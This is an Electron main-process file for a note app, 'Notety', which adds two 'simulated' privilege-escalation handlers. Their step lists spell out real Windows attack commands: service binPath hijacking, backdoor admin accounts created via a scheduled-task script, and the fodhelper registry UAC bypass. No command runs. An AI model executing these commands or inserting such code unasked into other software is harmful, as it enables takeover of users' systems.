import { createNote, deleteNote, getNotes, readNote, writeNote } from '@/lib'
import { electronApp, is, optimizer } from '@electron-toolkit/utils'
import { CreateNote, DeleteNote, GetNotes, ReadNote, WriteNote } from '@shared/types'
import { BrowserWindow, app, ipcMain, shell } from 'electron'
import path, { join } from 'path'
import icon from '../../resources/icon.ico?asset'
import fs from 'fs'

function createWindow(): void {
  // Create the browser window.
  const mainWindow = new BrowserWindow({
    icon: path.join(__dirname, '../../resources/icon.ico'),
    width: 900,
    height: 670,
    show: false,
    autoHideMenuBar: true,
    ...(process.platform === 'linux' ? { icon } : {}),
    center: true,
    title: 'Notety',
    backgroundMaterial: 'acrylic',
    visualEffectState: 'active',
    trafficLightPosition: { x: 15, y: 10 },
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: true,
      contextIsolation: true
    }
  })

  mainWindow.on('ready-to-show', () => {
    mainWindow.show()
  })

  mainWindow.webContents.setWindowOpenHandler((details) => {
    shell.openExternal(details.url)
    return { action: 'deny' }
  })

  // HMR for renderer base on electron-vite cli.
  // Load the remote URL for development or the local html file for production.
  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(() => {
  // Set app user model id for windows
  electronApp.setAppUserModelId('com.electron')

  // Default open or close DevTools by F12 in development
  // and ignore CommandOrControl + R in production.
  // see https://github.com/alex8088/electron-toolkit/tree/master/packages/utils
  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  ipcMain.handle('getNotes', (_, ...args: Parameters<GetNotes>) => getNotes(...args))
  ipcMain.handle('readNote', (_, ...args: Parameters<ReadNote>) => readNote(...args))
  ipcMain.handle('writeNote', (_, ...args: Parameters<WriteNote>) => writeNote(...args))
  ipcMain.handle('createNote', (_, ...args: Parameters<CreateNote>) => createNote(...args))
  ipcMain.handle('deleteNote', (_, ...args: Parameters<DeleteNote>) => deleteNote(...args))

  // Add these handlers
  ipcMain.handle('scanPrivilegeEscalation', async () => {
    try {
      // In a real tool, we would actually scan the system
      // For demo purposes, we're simulating a scan
      
      const simulatedServicePath = 'C:\\Program Files\\Vulnerable Service\\service.exe';
      const simulatedTaskPath = 'C:\\Windows\\Tasks\\AdminTask.bat';
      
      // Create a log file documenting the scan
      const userDataPath = app.getPath('userData');
      const scanLogPath = path.join(userDataPath, 'privesc-scan-log.txt');
      
      fs.writeFileSync(
        scanLogPath,
        `[PRIVILEGE ESCALATION VULNERABILITY SCAN]\n` +
        `Time: ${new Date().toISOString()}\n\n` +
        `This is a simulation of scanning for privilege escalation vulnerabilities.\n` +
        `In a real security tool, we would check for:\n\n` +
        `1. Unquoted service paths\n` +
        `2. Services with weak permissions\n` +
        `3. Scheduled tasks with modifiable targets\n` +
        `4. UAC bypass opportunities\n` +
        `5. AlwaysInstallElevated registry settings\n` +
        `6. Writeable directories in PATH\n\n` +
        `Results are simulated for educational purposes.\n`
      );
      
      // Simulated scan results
      return {
        scanLogPath,
        riskScore: 65, // 0-100 score simulating overall risk
        vulnerabilities: {
          unquoted: {
            name: 'Unquoted Service Path',
            found: true,
            description: 'Found services with unquoted paths containing spaces',
            details: `Service: VulnerableService\nPath: ${simulatedServicePath}\nStart Type: Automatic\nUser: LocalSystem`
          },
          servicePerms: {
            name: 'Weak Service Permissions',
            found: true,
            description: 'Services with modifiable configurations detected',
            details: `Service: UpdateService\nPermissions: NT AUTHORITY\\Authenticated Users:(WDAC,WO)\nStart Type: Automatic\nUser: LocalSystem`
          },
          scheduledTasks: {
            name: 'Vulnerable Scheduled Tasks',
            found: true,
            description: 'Scheduled tasks with writable targets found',
            details: `Task: SystemCleanup\nRun As: SYSTEM\nCommand: ${simulatedTaskPath}\nPermissions: BUILTIN\\Users:(W)`
          },
          uacBypass: {
            name: 'UAC Bypass Opportunity',
            found: false,
            description: 'No common UAC bypass vectors detected'
          },
          alwaysInstallElevated: {
            name: 'Always Install Elevated',
            found: false,
            description: 'AlwaysInstallElevated is not enabled'
          }
        }
      };
    } catch (error) {
      console.error('Error in scanPrivilegeEscalation:', error);
      return { error: (error instanceof Error ? error.message : 'An unknown error occurred') };
    }
  });

  ipcMain.handle('simulatePrivilegeEscalation', async (_, vector) => {
    try {
      let simulationSteps: string[] = [];
      let gainedPrivilege = '';
      
      // Different simulation steps based on the attack vector
      switch (vector) {
        case 'unquoted':
          simulationSteps = [
            '[*] Scanning for services with unquoted paths...',
            '[+] Found vulnerable service: VulnerableService',
            '[+] Path: C:\\Program Files\\Vulnerable Service\\service.exe',
            '[*] Checking directory permissions...',
            '[+] Directory "C:\\Program" is writable!',
            '[*] Creating malicious executable at C:\\Program.exe',
            '[*] Waiting for service restart...',
            '[*] Service restarted!',
            '[+] Malicious C:\\Program.exe executed with SYSTEM privileges',
            '[*] Creating backdoor admin account...',
            '[+] Added user "backdoor" to local administrators group'
          ];
          gainedPrivilege = 'SYSTEM';
          break;
          
        case 'service-perms':
          simulationSteps = [
            '[*] Scanning for services with weak permissions...',
            '[+] Found vulnerable service: UpdateService',
            '[*] Checking service permissions...',
            '[+] Service configuration is writable by current user!',
            '[*] Modifying service binary path...',
            '[>] sc config UpdateService binPath= "C:\\Windows\\Temp\\malicious.exe"',
            '[*] Binary path modified successfully',
            '[*] Restarting service...',
            '[>] sc stop UpdateService',
            '[>] sc start UpdateService',
            '[+] Service started our malicious executable with SYSTEM privileges',
            '[*] Creating persistent backdoor...'
          ];
          gainedPrivilege = 'SYSTEM';
          break;
          
        case 'scheduled-tasks':
          simulationSteps = [
            '[*] Scanning for vulnerable scheduled tasks...',
            '[+] Found task: SystemCleanup running as SYSTEM',
            '[*] Checking target file permissions...',
            '[+] Target script is writable: C:\\Windows\\Tasks\\AdminTask.bat',
            '[*] Modifying task script to add backdoor...',
            '[>] echo net user hacker Password123! /add >> C:\\Windows\\Tasks\\AdminTask.bat',
            '[>] echo net localgroup administrators hacker /add >> C:\\Windows\\Tasks\\AdminTask.bat',
            '[*] Waiting for task execution...',
            '[+] Task executed! Backdoor account created with admin privileges'
          ];
          gainedPrivilege = 'Administrator';
          break;
          
        case 'uac-bypass':
          simulationSteps = [
            '[*] Checking UAC configuration...',
            '[+] UAC level: Default',
            '[*] Looking for auto-elevate binaries...',
            '[+] Found vulnerable target: fodhelper.exe',
            '[*] Setting up registry key hijack...',
            '[>] New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force',
            '[>] Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(Default)" -Value "C:\\Windows\\Temp\\malicious.exe"',
            '[*] Executing fodhelper.exe...',
            '[+] Process launched without UAC prompt!',
            '[+] Malicious code executed with elevated privileges',
            '[*] Cleaning up registry keys...'
          ];
          gainedPrivilege = 'Administrator';
          break;
      }
      
      // In a real tool, we would create log files documenting the exploit
      const userDataPath = app.getPath('userData');
      const exploitLogPath = path.join(userDataPath, `privesc-${vector}-simulation.txt`);
      
      fs.writeFileSync(
        exploitLogPath,
        `[PRIVILEGE ESCALATION SIMULATION - ${vector.toUpperCase()}]\n` +
        `Time: ${new Date().toISOString()}\n\n` +
        `This is a simulation of exploiting a privilege escalation vulnerability.\n` +
        `In a real attack scenario, these steps would give an attacker elevated system access.\n\n` +
        `Simulation steps:\n` +
        simulationSteps.join('\n') +
        `\n\nResult: Successfully gained ${gainedPrivilege} privileges\n\n` +
        `NOTE: This is only a simulation for educational purposes. No actual exploitation occurred.\n`
      );
      
      return {
        exploitLogPath,
        simulationSteps,
        success: true,
        gainedPrivilege,
        vector
      };
    } catch (error) {
      console.error(`Error in simulatePrivilegeEscalation (${vector}):`, error);
      return { success: false, error: error instanceof Error ? error.message : 'An unknown error occurred' };
    }
  });

  createWindow()

  app.on('activate', function () {
    // On macOS it's common to re-create a window in the app when the
    // dock icon is clicked and there are no other windows open.
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

// In this file you can include the rest of your app"s specific main process
// code. You can also put them in separate files and require them here.
